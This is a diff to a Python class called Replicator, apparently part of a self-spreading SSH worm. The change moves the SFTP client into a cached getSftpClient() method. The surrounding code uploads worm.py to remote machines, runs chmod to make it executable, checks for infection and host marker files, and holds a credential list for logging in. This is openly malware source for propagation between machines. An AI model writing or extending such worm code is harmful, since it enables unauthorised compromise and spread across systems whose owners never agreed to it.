@@ -31,6 +31,7 @@ class Replicator(object):
 	CONNECTION_ERROR = 3
 
 	sshClient      = None
+	sftpClient     = None
 	host           = None
 	credentialList = None
 
@@ -41,13 +42,11 @@ class Replicator(object):
 
 	def spreadAndExecute(self, isHost):
 
-		sftpClient = self.sshClient.open_sftp()
-
 		if isHost:
 			self.compileWorm()
-			sftpClient.put(Replicator.COMPILE_TMP_DIRECTORY + "/worm.py", Replicator.WORM_FILE)
+			self.getSftpClient().put(Replicator.COMPILE_TMP_DIRECTORY + "/worm.py", Replicator.WORM_FILE)
 		else:
-			sftpClient.put("/tmp/worm.py", Replicator.WORM_FILE)
+			self.getSftpClient().put("/tmp/worm.py", Replicator.WORM_FILE)
 
 		self.sshClient.exec_command("chmod a+x " + Replicator.WORM_FILE)
 
@@ -116,14 +115,16 @@ class Replicator(object):
 		return (attemptResults, None)
 
 	def remoteSystemIsInfected(self):
-		sftpClient = self.sshClient.open_sftp()
-
-		return Replicator.remoteFileExists(sftpClient, Replicator.INFECTED_MARKER_FILE)
+		return Replicator.remoteFileExists(self.getSftpClient(), Replicator.INFECTED_MARKER_FILE)
 
 	def remoteSystemIsHost(self):
-		sftpClient = self.sshClient.open_sftp()
+		return Replicator.remoteFileExists(self.getSftpClient(), Replicator.HOST_MARKER_FILE)
 
-		return Replicator.remoteFileExists(sftpClient, Replicator.HOST_MARKER_FILE)
+	def getSftpClient(self):
+		if self.sftpClient is None:
+			self.sftpClient = self.sshClient.open_sftp()
+
+		return self.sftpClient
 
 	@staticmethod
 	def remoteFileExists(sftp, path):
